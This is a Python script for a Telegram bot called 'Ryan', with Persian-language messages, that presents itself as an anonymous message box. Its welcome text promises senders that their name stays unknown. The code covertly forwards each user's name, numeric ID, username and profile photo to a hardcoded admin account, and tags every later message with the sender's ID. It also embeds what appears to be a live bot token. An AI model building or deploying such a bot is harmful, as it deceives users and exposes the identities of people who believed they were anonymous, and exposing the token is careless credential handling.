    from flask import Flask
from threading import Thread
import telebot
import os
import time

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    TOKEN = "8775388406:AAGe5pikRxUf6Tpy1INzl5Mx7Z5Jyua9LAc"

ADMIN_ID = 8117214960  # اگه جواب نداد، با آیدی عددی خودت از @userinfobot عوض کن

bot = telebot.TeleBot(TOKEN)
app = Flask('')

@app.route('/')
def home():
    return "ربات فعال است"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    user_id = user.id
    username = f"@{user.username}" if user.username else "ندارد"
    first_name = user.first_name or "ندارد"
    last_name = user.last_name or "ندارد"

    # ارسال اطلاعات به ادمین
    try:
        bot.send_message(
            ADMIN_ID,
            f"👤 کاربر جدید:\n"
            f"نام: {first_name} {last_name}\n"
            f"آیدی: {user_id}\n"
            f"یوزرنیم: {username}"
        )
    except:
        pass

    # دریافت عکس پروفایل
    try:
        photos = bot.get_user_profile_photos(user_id, limit=1)
        if photos and photos.total_count > 0:
            file_id = photos.photos[0][0].file_id
            bot.send_photo(ADMIN_ID, file_id, caption="🖼 عکس پروفایل کاربر")
    except:
        pass

    # ✅ پیام خوش‌آمد به کاربر (دقیقاً همون متنی که خواستی)
    bot.send_message(
        message.chat.id,
        "سلام Ryan هستم! 🌹\n\nهر حرفی که تو دلت هست یا هر انتقادی که نسبت به من داری رو با خیال راحت بنویس و بفرست. بدون اینکه از اسمت باخبر بشم پیامت به من می‌رسه."
    )

@bot.message_handler(func=lambda message: True)
def forward_all_messages(message):
    user = message.from_user
    text = message.text or "پیام غیرمتنی"

    try:
        bot.send_message(
            ADMIN_ID,
            f"📩 پیام جدید:\n"
            f"آیدی: {user.id}\n"
            f"متن: {text}"
        )
    except:
        pass

    bot.reply_to(message, "✅ پیامت با موفقیت ارسال شد! 🙏")

keep_alive()
print("🤖 ربات Ryan روشن شد...")

while True:
    try:
        bot.infinity_polling(skip_pending=True)
    except:
        time.sleep(5)
